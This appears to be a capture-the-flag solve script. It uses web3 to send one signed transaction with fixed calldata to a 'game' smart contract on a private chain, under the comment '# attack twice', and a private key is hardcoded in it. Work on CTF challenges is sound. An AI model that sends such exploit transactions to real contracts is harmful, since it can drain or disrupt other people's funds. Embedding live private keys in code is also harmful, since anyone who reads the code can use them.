from web3 import Web3,HTTPProvider
from Crypto.Util.number import *
web3=Web3(HTTPProvider("http://43.132.224.5:8545"))
print(web3.is_connected())
acct= web3.eth.account.from_key('7bb22bc28680d0b414a7affb8ff9059291524611ab54f336f985a8ef2c5b6e77')
print(acct.address)
"""

"""

game_address="0xe4c6545126fC5FC30BA09e76f2C08D0dd91b649F"
# attack twice
def deploy(rawTx):
    signedTx = web3.eth.account.sign_transaction(rawTx, private_key="0x7bb22bc28680d0b414a7affb8ff9059291524611ab54f336f985a8ef2c5b6e77")
    hashTx = web3.eth.send_raw_transaction(signedTx.rawTransaction).hex()
    receipt = web3.eth.wait_for_transaction_receipt(hashTx)
    print(receipt)
    return receipt


def call(): 
    rawTx = {
        'from': acct.address,
        'to': game_address,
        'nonce': web3.eth.get_transaction_count(acct.address),
        'gasPrice': web3.to_wei(1,'gwei'),
        'gas': 487260,
        'value': web3.to_wei(0, 'ether'),
        'data': '0xb438d0180000000000000000000000000000000000000000000000000000000000000001',
        "chainId": 8888
    }
    deploy(rawTx)

    
if __name__ == '__main__':
    
    call()